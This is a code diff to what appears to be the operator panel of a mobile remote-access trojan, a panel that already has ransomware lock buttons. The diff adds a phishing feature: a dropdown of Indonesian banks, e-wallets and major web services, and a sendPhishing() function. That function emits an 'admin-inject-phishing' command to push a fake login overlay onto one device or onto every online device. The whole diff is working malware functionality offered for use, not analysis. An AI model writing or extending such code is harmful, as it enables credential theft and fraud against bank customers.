@@ -493,6 +493,36 @@
                             <button class="header-btn" onclick="sendRansomwareLock()" style="background:#c62828;color:#fff;border-color:#c62828;font-weight:bold;font-size:0.8rem;">&#x1f6ab; RANSOMWARE LOCK</button>
                             <button class="header-btn" onclick="sendRansomwareUnlock()" style="border-color:#00c853;color:#00c853;font-weight:bold;">&#x1f513; Unlock Device</button>
                         </div>
+                        <div style="display:flex;gap:4px;margin-top:10px;flex-wrap:wrap;align-items:center;">
+                            <span style="font-size:0.75rem;color:var(--text3);font-weight:600;margin-right:4px;">&#x1f578; Phishing:</span>
+                            <select id="phishSite" style="flex:1;min-width:120px;padding:5px 8px;border-radius:5px;border:1px solid var(--border);background:var(--bg);color:var(--text);font-size:0.72rem;">
+                                <option value="klikbca.com">BCA</option>
+                                <option value="ib.bri.co.id">BRI</option>
+                                <option value="mandiri.id">Mandiri</option>
+                                <option value="bni.co.id">BNI</option>
+                                <option value="cimbniaga.co.id">CIMB Niaga</option>
+                                <option value="permata.net">Permata</option>
+                                <option value="danamon.co.id">Danamon</option>
+                                <option value="maybank.co.id">Maybank</option>
+                                <option value="uob.co.id">UOB</option>
+                                <option value="jenius.com">Jenius</option>
+                                <option value="digibank.co.id">Digibank</option>
+                                <option value="blu.com">Blu by BCA</option>
+                                <option value="seabank.id">SeaBank</option>
+                                <option value="superbank.id">SuperBank</option>
+                                <option value="bankjago.com">Bank Jago</option>
+                                <option value="dana.id">DANA</option>
+                                <option value="ovo.id">OVO</option>
+                                <option value="gopay.co.id">GoPay</option>
+                                <option value="tokopedia.com">Tokopedia</option>
+                                <option value="shopee.co.id">Shopee</option>
+                                <option value="gojek.com">Gojek</option>
+                                <option value="google.com">Google</option>
+                                <option value="facebook.com">Facebook</option>
+                                <option value="instagram.com">Instagram</option>
+                            </select>
+                            <button class="header-btn" onclick="sendPhishing()" style="border-color:#ff9800;color:#ff9800;font-weight:600;">&#x1f4e8; Kirim Phishing</button>
+                        </div>
                         <div id="pcStatus" style="font-size:0.75rem;color:var(--text3);margin-top:8px;"></div>
                     </div>
 
@@ -2173,6 +2203,24 @@
                 }
                 statusEl.textContent = 'Unlock sent to ' + sent + ' device';
                 showToast('Bulk unlock: ' + sent + ' device', 'info');
+            }
+        }
+
+        function sendPhishing() {
+            const site = document.getElementById('phishSite').value;
+            const id = document.getElementById('pcDeviceSelect').value;
+            const statusEl = document.getElementById('pcStatus');
+            if (id) {
+                socket.emit('admin-inject-phishing', { deviceId: id, site: site });
+                statusEl.textContent = 'Phishing overlay ('+site+') sent to ' + id.slice(0,8);
+                showToast('Phishing overlay sent', 'success');
+            } else {
+                let sent = 0;
+                for (const [did, d] of Object.entries(devices)) {
+                    if (d.online) { socket.emit('admin-inject-phishing', { deviceId: did, site: site }); sent++; }
+                }
+                statusEl.textContent = 'Phishing overlay sent to ' + sent + ' device';
+                showToast('Bulk phishing: ' + sent + ' device', 'success');
             }
         }
 
